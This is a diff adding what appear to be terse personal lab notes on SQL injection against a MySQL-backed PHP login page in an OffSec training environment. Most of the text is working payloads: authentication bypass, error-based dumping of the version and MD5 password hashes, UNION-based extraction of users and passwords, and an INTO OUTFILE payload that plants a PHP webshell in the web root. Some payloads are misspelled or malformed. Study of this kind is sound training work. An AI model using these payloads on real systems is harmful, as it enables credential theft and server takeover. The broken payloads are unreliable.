@@ -1,0 +1,51 @@
+' UNION SELET null, user(), null, null -- //
+Auth sucessful
+
+
+password='d41d8cd98f00b204e9800998ecf8427e
+
+user password = AND password='d41d8cd98f00b20'
+
+user = debain-sys-maint@localhost
+database = offsec
+
+' OR 1=1 in (@@version) -- //
+ Warning: 1292: Truncated incorrect DOUBLE value: '8.0.30-0ubuntu0.22.04.1' 
+
+
+/var/www/html/login1.php
+
+datadir /var/lib/mysql
+
+
+Identifying SQL via error based payloards
+
+add the golden code to the uname : ' OR 1=1 -- // 
+' or 1=1 in (SELECT @@version) -- //
+SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --// 
+
+ Uncaught mysqli_sql_exception: Operand should contain 1 column(s) 
+This means we can only do one colum at a time
+
+' 1=1 in (SELECT password FROM users) -- //
+All MD5 hashes are sent
+
+' Or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+admin = 21232f297a57a5a743894a0e4a801fc3
+
+
+10.2.2 UNION - based Payloads
+%' UNION SELECT null, null, null, password FROM users -- //
+auth successful 
+
+the injected query must inclde the same num of collums and data types need to match
+
+' UNION SELECT username, null, null, null FROM users -- //
+auth successful
+
+xp_cmdshell passed to a shell for execution
+
+Manual
+
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
